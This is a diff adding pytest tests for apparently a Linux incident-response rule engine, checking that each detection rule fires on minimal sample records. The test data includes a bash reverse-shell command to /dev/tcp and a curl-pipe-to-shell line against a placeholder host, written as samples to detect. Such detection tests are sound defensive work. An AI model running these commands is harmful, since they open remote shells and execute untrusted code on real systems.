@@ -204,3 +204,72 @@ def test_list_values_matching():
     assert run(r, [{"pid": 1, "cmdline": ["bash", "-c", "x > /dev/tcp/1.2.3.4/1"]}])[0]
     assert run(r, [{"pid": 1, "cmdline": ["ls"]}])[0] == []
     assert run(r, [{"pid": 1}])[0] == []  # missing field: no match, no crash
+
+
+def _ts(sec):
+    return f"2026-03-10T11:00:{sec:02d}Z"
+
+
+# One minimal record set per shipped rule that the synthetic case does not trigger. Together with
+# the synthetic case this proves every rule's conditions can actually be satisfied.
+POSITIVE_SAMPLES = {
+    "LIR-AUTH-002": (
+        {
+            "logs": [
+                {"event_type": "ssh_invalid_user", "src_ip": "203.0.113.9", "ts": _ts(i * 10), "user": f"u{i}"}
+                for i in range(6)
+            ]
+        },
+        None,
+    ),
+    "LIR-FILE-003": (
+        {"files": [{"kind": "sensitive_file", "path": "/etc/shadow", "world_writable": True}]},
+        None,
+    ),
+    "LIR-FILE-005": (
+        {"files": [{"kind": "sensitive_file", "path": "/etc/passwd", "sha256": "b" * 64}]},
+        {"files": [{"kind": "sensitive_file", "path": "/etc/passwd", "sha256": "a" * 64}]},
+    ),
+    "LIR-NET-001": (
+        {"network": [{"kind": "socket", "state": "LISTEN", "proto": "tcp", "local_port": 4444, "process": "nc"}]},
+        {"network": []},
+    ),
+    "LIR-PERS-004": (
+        {"persistence": [{"kind": "systemd_unit", "path": "/etc/systemd/system/x.service", "sha256": "b" * 64}]},
+        {"persistence": [{"kind": "systemd_unit", "path": "/etc/systemd/system/x.service", "sha256": "a" * 64}]},
+    ),
+    "LIR-PERS-006": (
+        {"persistence": [{"kind": "cron_entry", "exec_binary": "/tmp/.x/run", "command": "/tmp/.x/run"}]},
+        None,
+    ),
+    "LIR-PERS-009": (
+        {
+            "persistence": [
+                {"kind": "rc_local", "path": "/etc/rc.local", "commands": ["curl http://x.example.test | sh"]}
+            ]
+        },
+        None,
+    ),
+}
+
+
+def _docs(sample):
+    return {name: {"records": recs, "status": "ok"} for name, recs in sample.items()}
+
+
+def test_every_shipped_rule_has_a_firing_test():
+    arts, _ = load_evidence(CASE)
+    base, _ = load_evidence(BASE)
+    rules = load_rules(RULES)
+    fired = {f.rule_id for f in evaluate(rules, arts, base)[0]}
+    uncovered = {r.id for r in rules} - fired - set(POSITIVE_SAMPLES)
+    assert not uncovered, f"add a positive sample for: {sorted(uncovered)}"
+
+
+@pytest.mark.parametrize("rule_id", sorted(POSITIVE_SAMPLES))
+def test_untriggered_rule_fires_on_minimal_sample(rule_id):
+    current, baseline = POSITIVE_SAMPLES[rule_id]
+    rules = [r for r in load_rules(RULES) if r.id == rule_id]
+    assert rules, rule_id
+    findings, notes = evaluate(rules, _docs(current), _docs(baseline) if baseline is not None else None)
+    assert [f.rule_id for f in findings if f.rule_id == rule_id], notes
